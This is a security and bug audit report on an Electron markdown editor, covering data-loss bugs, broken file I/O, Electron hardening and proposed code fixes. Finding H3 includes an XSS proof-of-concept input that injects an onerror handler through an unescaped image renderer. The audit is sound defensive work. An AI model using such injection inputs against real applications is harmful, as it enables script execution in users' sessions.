# Velox Markdown Studio — Full Audit Report

**Repository:** `https://github.com/authorss81/Velox-Markdown-Studio`
**Stack:** Electron 33 + React 19 + Vite 8 + TypeScript + Tailwind CSS v4 (+ `marked` 18, `highlight.js` 11)
**Size:** 22 source files, ~4,400 non-blank lines (`src/App.tsx` alone is ~1,000 raw lines)
**Date:** 2026-10-05 · **Method:** five parallel subagent audits; every file read in full

## What was audited

| # | Section | File in this report | Findings |
|---|---|---|---|
| 1 | Executive summary & fix order | *(this page)* | — |
| 2 | Functional bugs, dead code & missing error handling | §2 | 44 (6 critical · 9 high · 7 medium · 6 low · 9 dead-code · 7 error-handling) |
| 3 | Security (Electron, XSS, secrets, deps) | §3 | 14 (2 critical · 3 high · 1 medium · 8 low) + hardening checklist + CSP + dep table |
| 4 | Unimplemented, stubbed & broken features | §4 | 47-item feature matrix + 24 findings + shortcut/command matrices |
| 5 | Architecture, performance & code quality | §5 | 27 findings + responsibility map + backlog |
| 6 | UI/UX & visual design | §6 + §6b | 107 findings + token spec + palette + quick wins + benchmark |

## The verdict in 60 seconds

1. **A fresh clone cannot even install.** `vite@8.3.2` needs `esbuild ^0.27 || ^0.28`; `package.json` pins `esbuild ^0.25.0`. `npm install` exits with `ERESOLVE` (§4 F1, §5 A1). CI is red on every push.
2. **Opening a hostile `.md` file executes attacker JavaScript** inside the app window — no sanitizer on `marked` output (`S1`), plus an attribute-injection primitive in the custom image renderer (`S2`), plus no CSP, no permission handler, no navigation guard (§3). This is the worst class of finding in the report.
3. **The headline feature — "save straight back to disk" — cannot work in the shipped `.exe`.** Electron loads over `file://`, where the File System Access API is unavailable, so the app silently falls back to a read-only path. There is no preload/IPC fallback (§4 F2). The file you think you're editing is not the file on disk.
4. **Unsaved work is destroyed silently, three ways** — closing a dirty tab, quitting, reloading. No `beforeunload`, no dirty-close guard, no autosave (`B2`, `F16`). The discard code even has a celebratory toast.
5. **One click on a search result permanently breaks the editor** — a never-cleared `targetLine` re-selects a line after every keystroke (`B1`, `F8`).
6. **Every file path in the app is fabricated** (`C:\Users\Windows\Documents\…`), displayed as fact, copied to clipboard, and used as a database key — so two same-named files overwrite each other (`B4`, `B5`, `F3`).
7. **The window chrome lies.** Minimize calls `window.blur()`; Close is inert on the Home tab; Electron draws a real native title bar *above* the fake one (`H2`, `F6`).
8. **Markdown is re-parsed on every keystroke**, twice (preview + hidden export modal), with full `highlightAuto` across ~190 languages (`A2`, `A4`). Large documents will crawl.
9. **There is no design system.** Three dead CSS tokens, 14 font sizes, 11 radii, 16 shadows, 19 icon hues, zero focus rings, `dark:` variants driven by the OS instead of the theme toggle, dead animation classes on every modal, and a zoom control that doesn't zoom headings (§6).
10. **No `strict` TypeScript, no tests, no linter, no error boundaries, no preload.** The `strict` flag alone being off is why half the bugs compiled (`A3`, `A8`, `A11`, `A18`).

None of this is unfixable. But the honest summary is: **the app is a good-looking prototype wearing the UI of a finished editor — its install, persistence, file I/O, security boundary, and design tokens all need rebuilding, not patching.**

## Fix order (highest value first)

| Prio | Fix | Findings | Why first | Effort |
|---|---|---|---|---|
| P0 | Make the repo installable (delete `esbuild` pin, commit lockfile) | F1, A1 | Nothing else can be built, tested, or shipped until this works | S |
| P0 | Sanitize markdown output (DOMPurify) + fix the image renderer | S1, S2, F4 | Active stored-XSS; every file open is a gamble | S |
| P0 | One-shot `targetLine` (clear after jump) | B1, F8 | Single most user-hostile bug; two-line fix | S |
| P0 | Dirty-tab guard + `beforeunload` | B2, F16 | Silent data loss on every quit/close | S |
| P0 | Real file I/O via preload + IPC (`md:open/save/saveAs`, window controls) | F2, H2, F6 | Headline feature + fake window buttons; the architectural keystone | M |
| P1 | Stop fabricating paths (store handle, key by id) | B4, B5, F3 | Data loss by record collision | S |
| P1 | Electron containment (CSP, `will-navigate`, `setWindowOpenHandler`, permission deny-list) | S3–S5 | Turns any future renderer bug from compromise into dead payload | S |
| P1 | Intercept markdown link clicks (`shell.openExternal`) | F5 | One click currently replaces the whole app with a remote page | S |
| P1 | Fix selection reseed + persist zoom/wrap/sync-scroll | B3, H6, F11, F17 | Settings/history that gaslight the user | S |
| P1 | Debounced preview + `highlight.js/lib/core`, no `highlightAuto` on keystrokes | A2, A4, A5 | The performance floor for real documents | M |
| P1 | Token layer (`@theme`), class-driven `dark:`, focus rings, split-pane resize | U1, U2, I1, S3 | Lifts the whole app from "cheap" to "considered" in one pass | M |
| P1 | `strict: true` + ErrorBoundary + keep caption/window fixes together | A3, A8, A6 | Stops the next 40 bugs from compiling | M |

Corrections made during this audit (claims checked and found wrong, so not repeated):
`metadata.json` **is** valid JSON; `canvas-confetti` **is** used; the install failure is caused by `esbuild`, not `@google/genai`; `motion` does **not** force any CSP weakening; `vite@8.3.0` / `typescript@7.0.2` are real stable releases, not phantoms.

## How to read this report

Each finding has a severity, the exact `file:line`, the offending code, what the user experiences, and a concrete fix (often copy-pasteable). Cross-section duplicates are intentional: the same defect appears where a security reader (§3), a feature reader (§4), and a bug reader (§2) each expect it — the IDs differ (`S2` ≡ `F4`-adjacent ≡ `H3`) but the evidence agrees. When two sections disagree on a detail, the one with executed proof (marked output captured, `npm view` data, `tsc` run) wins, and the disagreement is noted inline.

---

## 2. Functional Bugs, Dead Code & Missing Error Handling

## BUGS

### [CRITICAL] B1. One line-jump permanently breaks the editor — every keystroke re-selects and overwrites the target line

- **File:** `src/components/RawEditor.tsx:73-94` + `src/components/RawEditor.tsx:96-103`, root cause at `src/App.tsx:55`, `180`, `224`
- **Code:**
```tsx
// RawEditor.tsx:73
const scrollToLine = useCallback((lineNumber: number) => {
  ...
  textarea.focus();
  textarea.setSelectionRange(charIndex, charIndex + lineLength);
  ...
}, [content]);                     // <-- new identity on EVERY keystroke

// RawEditor.tsx:96
useEffect(() => {
  if (targetLine && targetLine > 0) {
    setTimeout(() => { scrollToLine(targetLine); }, 100);
  }
}, [targetLine, scrollToLine]);
```
```tsx
// App.tsx:55
const [targetLine, setTargetLine] = useState<number | null>(null);
// App.tsx:180 / 224 — the ONLY two writes; never reset to null
setTargetLine(lineToJump);
```
- **What's wrong:** `scrollToLine` is memoised on `content`, so it is a new function on every render caused by typing. The jump effect therefore re-fires 100 ms after **every single character typed**, and it calls `focus()` + `setSelectionRange(charIndex, charIndex + lineLength)` — i.e. it *selects the entire target line* and yanks focus back into the textarea. `targetLine` is App-level state that is never cleared (grep confirms only two `setTargetLine` calls, neither passing `null`), so the state is sticky forever and survives tab switches.
- **User-visible impact:** Click any search result snippet in Home → *"Jump to line 42"*. Now move the caret anywhere and type: 100 ms later the view scrolls back to line 42, the whole line 42 is selected, and the next keystroke **replaces line 42 with what you typed**, silently destroying that line. The editor is unusable until the app is restarted. This also steals focus 100 ms after every keystroke, so clicking a toolbar button or any other control mid-edit snaps focus back into the editor.
- **Fix:** Make `targetLine` a one-shot edge signal and keep `scrollToLine` off the `content` dependency.
```tsx
// RawEditor.tsx:73 — read content from a ref so the callback is stable
const contentRef = useRef(content);
contentRef.current = content;

const scrollToLine = useCallback((lineNumber: number) => {
  const textarea = textareaRef.current;
  if (!textarea) return;
  const linesArr = contentRef.current.split('\n');
  ...
}, []);

// RawEditor.tsx:96 — consume targetLine once, with timer cleanup
useEffect(() => {
  if (!targetLine || targetLine <= 0) return;
  const id = setTimeout(() => scrollToLine(targetLine), 100);
  onTargetLineHandled?.();            // App: setTargetLine(null)
  return () => clearTimeout(id);
}, [targetLine, scrollToLine, onTargetLineHandled]);
```
```tsx
// App.tsx — pass the reset callback, drop the duplicate ad-hoc timeouts at 181-183 / 225-227
<RawEditor targetLine={targetLine} onTargetLineHandled={() => setTargetLine(null)} ... />
```

### [CRITICAL] B2. Unsaved work is destroyed without any warning; there is no autosave and no session restore

- **File:** `src/App.tsx:593-608`, `src/types/index.ts:65`, `src/components/TitleBar.tsx:150-160`
- **Code:**
```tsx
// App.tsx:593
const handleCloseTab = useCallback((fileId: string) => {
  const tabToClose = tabs.find((t) => t.fileId === fileId);
  if (!tabToClose) return;            // isDirty is never consulted
  const remaining = tabs.filter((t) => t.fileId !== fileId);
  setTabs(remaining);
  ...
}, [tabs, activeTabId, showToast]);
```
- **What's wrong:** (a) `handleCloseTab` drops the tab unconditionally, so `isDirty` edits vanish; Ctrl+W (`App.tsx:656-660`) and middle-click close (`TabBar.tsx:53-59`) route straight into it. (b) `grep -n "beforeunload"` across the repo returns **zero** hits — there is no unload guard, and `TitleBar`'s close button calls `window.close()` with no guard either. (c) `AppSettings.autoSave` (`types/index.ts:65`) is declared and defaulted (`storage.ts:20`) but **never read by any code path** — autosave is not implemented. (d) `tabs`/`activeTabId` live only in React state; nothing is persisted, so every open tab is lost on restart (only `files[0]` is auto-reopened, `App.tsx:143-163`).
- **User-visible impact:** Type for ten minutes in Raw/Split mode, click the tab's ✕ (or Ctrl+W): every character is gone, with only a "Closed ..." toast. Quit the app with unsaved edits: same, silently.
- **Fix:** Guard the close and add an unload prompt + autosave.
```tsx
const handleCloseTab = useCallback((fileId: string) => {
  const tabToClose = tabs.find((t) => t.fileId === fileId);
  if (!tabToClose) return;
  if (tabToClose.isDirty) {
    const choice = window.confirm(`"${tabToClose.name}" has unsaved changes. Discard them?`);
    if (!choice) return;
  }
  ...
}, [tabs, activeTabId, showToast]);

// App.tsx — add at mount
useEffect(() => {
  const onBeforeUnload = (e: BeforeUnloadEvent) => {
    if (tabs.some((t) => t.isDirty)) { e.preventDefault(); e.returnValue = ''; }
  };
  window.addEventListener('beforeunload', onBeforeUnload);
  return () => window.removeEventListener('beforeunload', onBeforeUnload);
}, [tabs]);

// and a debounced autosave honouring AppSettings.autoSave (types/index.ts:65)
```

### [CRITICAL] B3. "Clear History" and "delete last record" silently undo themselves — samples are re-seeded

- **File:** `src/services/storage.ts:23-52` (root), `src/services/storage.ts:169-177`, `src/App.tsx:624-628`
- **Code:**
```ts
// storage.ts:25
const records = await get<MarkdownFileRecord[]>(STORAGE_KEYS.RECENT_FILES);
if (records && records.length > 0) {     // <-- [] falls through
  return records;
}
...
// storage.ts:41
// Initialize with initial samples
const now = Date.now();
const initialFiles: MarkdownFileRecord[] = SAMPLE_FILES.map(...);
await saveAllRecentFiles(initialFiles);  // <-- and WRITES them back
return initialFiles;
```
```ts
// storage.ts:169 — writes an empty array
export async function clearFileHistory(): Promise<void> {
  await set(STORAGE_KEYS.RECENT_FILES, []);
  await set(STORAGE_KEYS.FILE_HISTORY, []);
```
- **What's wrong:** An empty stored array is indistinguishable from "never initialised", so `getRecentFiles()` re-seeds and **re-persists** the three `SAMPLE_FILES` on the very next read. `handleClearHistory` only sets local `recentFiles` to `[]`, so the UI *looks* cleared until any operation calls `getRecentFiles()` again (`saveFileRecord:115`, `handleOpenFileById:236`, `handleSave:452`, drop handler, etc.) — at which point the samples reappear. The same happens when the last real record is deleted (`deleteFileRecord:158`), and on the next launch.
- **User-visible impact:** Click "Clear History" → table empties → open or save any file → "Welcome to Velox Markdown Studio.md", "Technical Specification…", "Markdown Syntax Quick Reference.md" are back in the user's file list, un-asked-for and un-deletable in bulk.
- **Fix:** Track initialisation with a sentinel key instead of inferring it from emptiness.
```ts
// storage.ts
const STORAGE_KEYS = { /* ... */ INITIALIZED: 'velox_initialized_v1' };

export async function getRecentFiles(): Promise<MarkdownFileRecord[]> {
  try {
    const records = await get<MarkdownFileRecord[]>(STORAGE_KEYS.RECENT_FILES);
    if (Array.isArray(records)) return records;            // honour [] as "cleared"
    const seeded = await get<boolean>(STORAGE_KEYS.INITIALIZED);
    if (seeded) return [];
  } catch (err) {
    const local = localStorage.getItem(STORAGE_KEYS.RECENT_FILES);
    if (local) { try { return JSON.parse(local); } catch { /* ignore */ } }
  }
  const now = Date.now();
  const initialFiles = SAMPLE_FILES.map((s, i) => ({ ...s, lastOpened: now - i * 1_800_000, lastModified: now - i * 3_600_000, hasFileSystemHandle: false }));
  await saveAllRecentFiles(initialFiles);
  await set(STORAGE_KEYS.INITIALIZED, true);
  return initialFiles;
}
```

### [CRITICAL] B4. Fabricated file paths + path-based dedupe in `saveFileRecord` make documents overwrite each other

- **File:** `src/App.tsx:361-367`, `src/App.tsx:266`, `src/services/storage.ts:116-118` & `129`
- **Code:**
```tsx
// App.tsx:359
const handleNewFile = useCallback(() => {
  const fileId = `new-${Date.now()}`;
  const name = `Untitled-${tabs.length + 1}.md`;        // <-- reused after a tab is closed
  ...
  path: `C:\\Users\\Windows\\Documents\\${name}`,        // <-- never the real path
```
```ts
// storage.ts:116
const existingIdx = current.findIndex(
  (f) => f.id === file.id || (f.path && file.path && f.path === file.path)   // <-- path is the identity
);
...
// storage.ts:129
updatedList[existingIdx] = { ...updatedList[existingIdx], ...updatedRecord };  // <-- clobbers it
```
- **What's wrong:** Every opened/dropped/new file gets a **made-up** path `C:\Users\Windows\Documents\<name>` (App.tsx:266, 323, 525, 719) — the File System Access API never exposes the real directory — yet `saveFileRecord` treats that string as the primary key. `handleNewFile` derives the name from `tabs.length + 1`, so after closing a tab the counter resets and the *same* name/path is produced again.
- **User-visible impact:** Create `Untitled-1.md`, type, Ctrl+S (record saved). Close the tab, Ctrl+N again → another `Untitled-1.md` with the identical fabricated path. Type in it and Ctrl+S → `findIndex` matches the *first* document's record and overwrites its content. The first document's saved copy is gone from the app with no warning. The same collision fires for any two different files that share a filename in different folders.
- **Fix:** Stop fabricating paths (use the handle's `name` only, mark the path unknown), and stop deduping on path.
```ts
// storage.ts:116
const existingIdx = current.findIndex((f) => f.id === file.id);   // id is the only identity

// App.tsx:266 / 323 / 525 / 719 — don't invent a directory
path: file.name,                       // FileSystemFileHandle exposes no path in the renderer
```
Rename untitled docs uniquely: `const name = \`Untitled-${Date.now()}.md\`;`

### [CRITICAL] B5. Opening the same file twice hijacks its history record; one tab becomes unopenable and the tabs clobber each other

- **File:** `src/App.tsx:259`, `src/App.tsx:278-295`, `src/App.tsx:188-189`, `src/services/storage.ts:116-129`
- **Code:**
```tsx
// App.tsx:259 — a brand-new id every single time, no check against open tabs
const fileId = `file-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;
...
await saveFileRecord(record, handle);   // App.tsx:278
```
```tsx
// App.tsx:188
const record = recentFiles.find((f) => f.id === fileId);
if (!record) return;                    // <-- silent no-op
```
- **What's wrong:** Ctrl+O on the same `.md` twice yields two tabs with **different** `fileId`s but the **same** fabricated `path`. The second `saveFileRecord` matches the first record by path and replaces its `id` with the new one (`{...existing, ...updated}` at storage.ts:129). The first tab's id now matches nothing: `recentFiles.find(...)` at App.tsx:188 returns `undefined`, the function returns silently, and the file can never be reopened from Home or the palette. The stored IDB handle key `velox_handle_<oldId>` is orphaned. Saving tab 1 then overwrites tab 2's history entry (same path).
- **User-visible impact:** Open `notes.md`, Ctrl+O it again → two tabs. Edit tab 2, save. Now tab 1's document has vanished from the File History list; editing and saving tab 1 overwrites tab 2's stored copy. Closing and reopening either tab silently does nothing.
- **Fix:** Reuse an existing record/tab for a handle that is already open, and keep `id` stable on merge.
```ts
// storage.ts:129 — never let a merge change identity
updatedList[existingIdx] = { ...updatedList[existingIdx], ...updatedRecord, id: updatedList[existingIdx].id };
```
```tsx
// App.tsx:240 — before minting a new id, look for an already-indexed record with this handle
const existingRec = recentFiles.find((r) => r.hasFileSystemHandle && r.name === file.name);
const fileId = existingRec?.id ?? `file-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
```

### [CRITICAL] B6. The persistence layer swallows quota/IO failures while the UI reports a successful save

- **File:** `src/services/storage.ts:54-68`, `src/App.tsx:487-495`, `src/services/storage.ts:120-137`
- **Code:**
```ts
// storage.ts:54 — the ENTIRE library (every file, full content) is one IDB value
export async function saveAllRecentFiles(files: MarkdownFileRecord[]): Promise<void> {
  try { await set(STORAGE_KEYS.RECENT_FILES, files); }
  catch (err) { console.warn('IndexedDB set failed, falling back to localStorage', err); }
  try { localStorage.setItem(STORAGE_KEYS.RECENT_FILES, JSON.stringify(files)); }
  catch (err) { console.warn('localStorage set failed', err); }   // <-- QuotaExceededError ignored
  await syncFileHistory(files);
}
```
```tsx
// App.tsx:487 — clears the dirty flag and claims success regardless
setTabs((prev) => prev.map((t) => t.fileId === activeTab.fileId
  ? { ...t, originalContent: activeTab.content, isDirty: false } : t));
showToast(`Saved to Permanent Memory. Use "Save As" to save to a specific Windows folder.`);
```
- **What's wrong:** Every save rewrites one monolithic IDB blob plus a full localStorage mirror. Both failure modes (IDB quota, ~5 MB localStorage quota) are caught and reduced to `console.warn`, and `saveFileRecord`/`saveAllRecentFiles` still resolve successfully. `handleSave` therefore clears `isDirty` and shows "Saved to Permanent Memory" even though nothing was persisted.
- **User-visible impact:** With a modest library of large files, saving starts silently failing. The Status Bar flips to "Saved in Permanent Memory", the dirty dot disappears, but a restart loses every edit since the last successful write — with zero error shown.
- **Fix:** Propagate failure and tell the user.
```ts
export async function saveAllRecentFiles(files: MarkdownFileRecord[]): Promise<void> {
  const errors: unknown[] = [];
  try { await set(STORAGE_KEYS.RECENT_FILES, files); } catch (e) { errors.push(e); }
  try { localStorage.setItem(STORAGE_KEYS.RECENT_FILES, JSON.stringify(files)); }
  catch (e) { errors.push(e); console.warn('localStorage set failed', e); }
  await syncFileHistory(files);
  if (errors.length) throw new Error(`Persist failed (${errors.length} backend(s))`);
}

// App.tsx:484 — surface it
try { await saveFileRecord(record); } catch (e) { showToast(`Save FAILED: ${String(e)}`); return; }
```

---

### [HIGH] H1. Task-list checkboxes are rendered `disabled` by marked, so the "interactive checklist" handler is unreachable

- **File:** `src/components/MarkdownPreview.tsx:58-81`, `src/index.css:382-389`, `src/data/samples.ts:71-78`
- **Code:**
```tsx
// MarkdownPreview.tsx:58
if (target.tagName === 'INPUT' && (target as HTMLInputElement).type === 'checkbox') {
  const checkbox = target as HTMLInputElement;
  ...
  onContentChange(updated);
```
- **What's wrong:** marked v18's renderer emits task checkboxes with the `disabled` attribute (verified against `marked@18.0.14/lib/marked.esm.js`: ``checkbox({checked:e}){return"<input "+(e?'checked="" ':"")+'disabled="" type="checkbox"> '}``). A `disabled` input does not dispatch click events, so this entire branch — ~24 lines of regex-toggling logic — can never run. The CSS at index.css:382-389 nevertheless styles them `cursor: pointer`, and `samples.ts:71-78` advertises an "Interactive Task Checklist".
- **User-visible impact:** In Preview and Split view, clicking a checkbox in a `- [ ]` task list does absolutely nothing. There is no way to tick a task off without switching to Raw mode.
- **Fix:** Strip `disabled` from rendered checkboxes.
```ts
// markdown.ts — after markedInstance.use({...}), add a post-process renderer
markedInstance.use({
  renderer: {
    listitem(token) {
      const body = this.parser.parse(token.tokens, this.parser.textRenderer);
      return `<li>${body.replace(/<input (checked="" )?disabled="" type="checkbox">/g,
        '<input $1type="checkbox">')}</li>\n`;
    },
  },
});
```

### [HIGH] H2. Electron integration is non-functional: no preload script, so the caption buttons cannot work

- **File:** `electron/main.cjs:18-23` (no `preload`), `src/components/TitleBar.tsx:130-160`, `src/App.tsx:784-791`
- **Code:**
```js
// electron/main.cjs:18
webPreferences: {
  nodeIntegration: false,
  contextIsolation: true,
  webSecurity: true,
},        // <-- no preload, and no ipcMain/ipcRenderer anywhere in the repo
```
```tsx
// TitleBar.tsx:130
<button onClick={() => { window.blur(); }} title="Minimize">
// TitleBar.tsx:150
<button onClick={() => { if (activeTab) { window.close(); } }} title="Close">
```
- **What's wrong:** Confirmed: `electron/` contains only `main.cjs`; `grep -n "preload|contextBridge|ipcRenderer"` over the whole repo returns nothing. Under `contextIsolation: true` / `nodeIntegration: false` the renderer has no Node access and no IPC bridge, so `window.blur()` (which merely drops focus — it does not minimize a window) and `window.close()` (a no-op for the main Electron window, and only reachable when a tab is open) cannot do what the buttons promise. Also, `App.tsx:788-790` passes `onNewFile`/`onOpenFile` to `TitleBar`, which never destructures them (see D1) — there is no New/Open button in the title bar at all.
- **User-visible impact:** The Windows-style Minimize (−) button appears to do nothing; Close (✕) silently does nothing (and is completely inert while on the Home tab). The user cannot minimize or close the app from the custom title bar.
- **Fix:** Add a preload bridge and route the caption buttons through IPC.
```js
// electron/preload.cjs
const { contextBridge, ipcRenderer } = require('electron');
contextBridge.exposeInMainWorld('velox', {
  minimize: () => ipcRenderer.send('win:minimize'),
  maximize: () => ipcRenderer.send('win:maximize'),
  close:    () => ipcRenderer.send('win:close'),
  onMaximizeChange: (cb) => ipcRenderer.on('win:maximized', (_e, v) => cb(v)),
});

// electron/main.cjs — webPreferences.preload = path.join(__dirname, 'preload.cjs')
ipcMain.on('win:minimize', (e) => BrowserWindow.fromWebContents(e.sender)?.minimize());
ipcMain.on('win:maximize',  (e) => { const w = BrowserWindow.fromWebContents(e.sender); w.isMaximized() ? w.unmaximize() : w.maximize(); });
ipcMain.on('win:close',     (e) => BrowserWindow.fromWebContents(e.sender)?.close());
```
Also gate `win:close` on a `beforeunload`-style check for dirty tabs.

### [HIGH] H3. Custom image renderer interpolates unescaped user text into `dangerouslySetInnerHTML`

- **File:** `src/services/markdown.ts:12-28`, consumed at `src/components/MarkdownPreview.tsx:147`
- **Code:**
```ts
// markdown.ts:12
image({ href, title, text }) {
  const titleAttr = title ? `title="${title}"` : '';
  const altAttr = text ? `alt="${text}"` : 'alt="Markdown Image"';
  return `
    <figure ...>
      <img src="${href}" ${altAttr} ${titleAttr} class="..." data-zoomable="true" loading="lazy" />
```
- **What's wrong:** marked's own renderer escapes and sanitises these values (`` `<img src="${O(e)}" alt="${O(n)}"` `` with `cleanUrl` rejecting `javascript:`), but this override does neither. `href`, `title` and the alt `text` are spliced raw into an HTML string that is then injected with `dangerouslySetInnerHTML`.
- **User-visible impact:** Legitimate markdown breaks rendering — `![a "quoted" caption](x.png)` or a title containing `"` terminates the attribute early and corrupts the surrounding markup (image disappears / caption leaks as text). Worse, `![x" onerror="alert(1)](img.png)` in any opened `.md` file injects arbitrary attributes/event handlers into the preview, and the injected markup is also copied verbatim into the exported standalone HTML (`ExportModal.tsx:25-28`).
- **Fix:** Escape all three values (and reuse marked's URL cleaning).
```ts
image({ href, title, text }) {
  const esc = (s: string) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  const safeHref = /^(https?:|data:image\/|file:|blob:)/i.test(href) ? esc(href) : '';
  const titleAttr = title ? `title="${esc(title)}"` : '';
  const altAttr = text ? `alt="${esc(text)}"` : 'alt="Markdown Image"';
  ... <img src="${safeHref}" ${altAttr} ${titleAttr} ...
```

### [HIGH] H4. `Save As` silently unpins the document and discards its tags

- **File:** `src/App.tsx:522-537` + `src/services/storage.ts:129`
- **Code:**
```tsx
// App.tsx:522
const record: MarkdownFileRecord = {
  id: activeTab.fileId,
  ...
  isPinned: false,                 // <-- hard-coded
  tags: ['Windows File'],          // <-- existing tags discarded
  hasFileSystemHandle: true,
};
```
```ts
// storage.ts:129
updatedList[existingIdx] = { ...updatedList[existingIdx], ...updatedRecord };  // updatedRecord wins
```
- **What's wrong:** `handleSave` preserves these fields (`App.tsx:446-447`: `recentFiles.find(...)?.isPinned || false` / `?.tags || [...]`), but `handleSaveAs` does not, and the merge at storage.ts:129 lets the incoming record override them.
- **User-visible impact:** Pin a document to Quick Access, press Ctrl+Shift+S, pick a location: the document immediately disappears from the pinned section on the Home page and all its tags are replaced with "Windows File".
- **Fix:**
```tsx
// App.tsx:533
isPinned: recentFiles.find((f) => f.id === activeTab.fileId)?.isPinned ?? false,
tags: recentFiles.find((f) => f.id === activeTab.fileId)?.tags ?? ['Windows File'],
```

### [HIGH] H5. `saveFileRecord` is a read-modify-write over one shared array — concurrent saves lose records

- **File:** `src/services/storage.ts:111-137`
- **Code:**
```ts
// storage.ts:115
const current = await getRecentFiles();                    // await #1 (read)
const existingIdx = current.findIndex(...);
...
await saveAllRecentFiles(updatedList);                     // await #2 (write)
```
- **What's wrong:** Between the read and the write there are `await` boundaries, and `getRecentFiles()` *itself* can `await saveAllRecentFiles(...)` (storage.ts:50) when the store is empty. Two overlapping saves (e.g. the drop handler at `App.tsx:730` and a Ctrl+S at `App.tsx:484`, or two dropped files) both read the same snapshot and the second write discards the first one's insertion.
- **User-visible impact:** Drop three files onto the window quickly, or drop files while saving: one or more of them vanish from File History even though the toast reported them opened, and the corresponding tab becomes a ghost that cannot be re-opened (B5's `if (!record) return`).
- **Fix:** Serialise writes behind a promise chain.
```ts
let writeChain: Promise<unknown> = Promise.resolve();
export function saveFileRecord(file: MarkdownFileRecord, fileHandle?: FileSystemFileHandle): Promise<void> {
  writeChain = writeChain.then(() => doSaveFileRecord(file, fileHandle));
  return writeChain as Promise<void>;
}
```

### [HIGH] H6. Zoom / word-wrap / sync-scroll settings are never persisted

- **File:** `src/App.tsx:810-839` vs `src/App.tsx:135-136`
- **Code:**
```tsx
// App.tsx:136 — the ONLY saveAppSettings call in the app
saveAppSettings({ ...settings, theme: next });
```
```tsx
// App.tsx:825
onToggleWordWrap={() => setWordWrap(!wordWrap)}                       // not persisted
onZoomIn={() => { setFontSize((s) => { const next = Math.min(s + 2, 32); ... }) }}   // not persisted
onToggleSyncScroll={() => { setSyncScroll((prev) => { ... }) }}       // not persisted
```
- **What's wrong:** `getAppSettings`/`saveAppSettings` support these fields (`storage.ts:16-18`, `AppSettings` at `types/index.ts:57-66`), but only `theme` is ever written. On mount, `App.tsx:110-112` restores them from storage — which always holds the defaults.
- **User-visible impact:** Set zoom to 24px and turn word wrap off; restart the app and both are back at their defaults. A user who prefers no-wrap must reconfigure on every launch.
- **Fix:** Persist each change, e.g.
```tsx
const persist = useCallback((patch: Partial<AppSettings>) => {
  saveAppSettings({ ...getAppSettings(), ...patch });
}, []);
onToggleWordWrap={() => { setWordWrap((w) => { const n = !w; persist({ wordWrap: n }); showToast(`Word wrap ${n ? 'on' : 'off'}`); return n; }); }}
onZoomIn={() => setFontSize((s) => { const n = Math.min(s + 2, 32); persist({ fontSize: n }); return n; })}
onToggleSyncScroll={() => setSyncScroll((p) => { const n = !p; persist({ syncScroll: n }); showToast(`Sync Scroll ${n ? 'Enabled' : 'Disabled'}`); return n; })}
```

### [HIGH] H7. "Jump to line N" computes `scrollTop` from logical lines, so it is wrong whenever word wrap is on (the default)

- **File:** `src/components/RawEditor.tsx:87-92`
- **Code:**
```tsx
// Approximate line height ~24px
const lineHeight = 24;
textarea.scrollTop = Math.max(0, (lineNumber - 5) * lineHeight);
```
- **What's wrong:** `scrollTop` is computed as `logicalLine * 24`, but with `wordWrap` true (the default, `App.tsx:43`, `storage.ts:16`) the textarea wraps long lines, so N logical lines occupy far more than `N * 24` px. The caret/selection is placed correctly (character offsets are exact), but the scroll offset is not, so the caret can land off-screen.
- **User-visible impact:** Click a search-result snippet in a document with long paragraphs: the editor scrolls somewhere unrelated while the selection sits off-screen, and it looks like the jump failed.
- **Fix:** Measure the real offset instead of estimating.
```ts
textarea.focus();
textarea.setSelectionRange(charIndex, charIndex);           // caret only, no select-all side effect
requestAnimationFrame(() => {
  const lineEl = ...;  // mirror div / or: use the line-number gutter
  textarea.scrollTop = Math.max(0, (targetY - textarea.clientHeight / 2));
});
// simplest reliable route: derive from the gutter, whose rows are exactly one per logical line
const gutterRow = lineNumbersRef.current?.children[lineNumber - 1] as HTMLElement | undefined;
if (gutterRow) textarea.scrollTop = Math.max(0, gutterRow.offsetTop - 80);
```

### [HIGH] H8. Typing a single space in the Home search box blanks the entire page

- **File:** `src/components/HomePage.tsx:159`, `192`, `303`, `361`
- **Code:**
```tsx
{searchQuery.trim() && (            // line 192  — trimmed
{!searchQuery && pinnedFiles.length > 0 && (   // line 303 — NOT trimmed
{!searchQuery && (                  // line 361 — NOT trimmed
```
- **What's wrong:** Three sibling sections test `searchQuery` with inconsistent truthiness. A single space `" "` is truthy but trims to `""`.
- **User-visible impact:** Press space in the search box and the search results, the pinned documents and the entire File History table vanish at once; the header still reads *"Found 0 files matching " ""*. The page looks broken with no way back except another keystroke.
- **Fix:** Normalise once.
```tsx
const q = searchQuery.trim();
const searchResults = useMemo(() => (q ? searchMarkdownFiles(recentFiles, q) : []), [recentFiles, q]);
// then use {q && ...} for all three sections and render the counter only when q
```

### [HIGH] H9. Closing or reloading with the Command Palette / modals open still triggers global shortcuts

- **File:** `src/App.tsx:641-672`
- **Code:**
```tsx
// App.tsx:641 — no modal guard anywhere in the handler
useEffect(() => {
  const handleKeyDown = (e: KeyboardEvent) => {
    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 's') { e.preventDefault(); ... handleSave(); }
    else if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'w') {
      if (activeTabId) { e.preventDefault(); handleCloseTab(activeTabId); }   // <-- discards unsaved edits
    }
    ...
  };
  window.addEventListener('keydown', handleKeyDown);
```
- **What's wrong:** The listener is bound to `window` and never checks whether `showCommandPalette`, `showShortcuts`, `showExportModal` or `lightboxImage` is open. Combined with B2 (no dirty guard) this is destructive.
- **User-visible impact:** With the Shortcuts modal or Export modal open, Ctrl+W closes the active document and throws away unsaved edits; Ctrl+N creates a tab invisibly behind the modal; Ctrl+S saves the active document while the user is typing into the palette's search box.
- **Fix:**
```tsx
if (showCommandPalette || showShortcuts || showExportModal || lightboxImage) return;   // top of handleKeyDown
```
(include those four in the effect's dependency array).

---

### [MEDIUM] M1. `isFullscreen` is never reconciled with reality

- **File:** `src/components/TitleBar.tsx:21-34`, `141-149`
- **Code:**
```tsx
const [isFullscreen, setIsFullscreen] = React.useState(false);
const toggleFullscreen = () => {
  if (!document.fullscreenElement) { document.documentElement.requestFullscreen().catch(() => {}); setIsFullscreen(true); }
  ...
};
```
- **What's wrong:** The state is only written inside the click handler; there is no `fullscreenchange` listener. `requestFullscreen()` can also reject (`.catch(() => {})` swallows it) while `setIsFullscreen(true)` has already run.
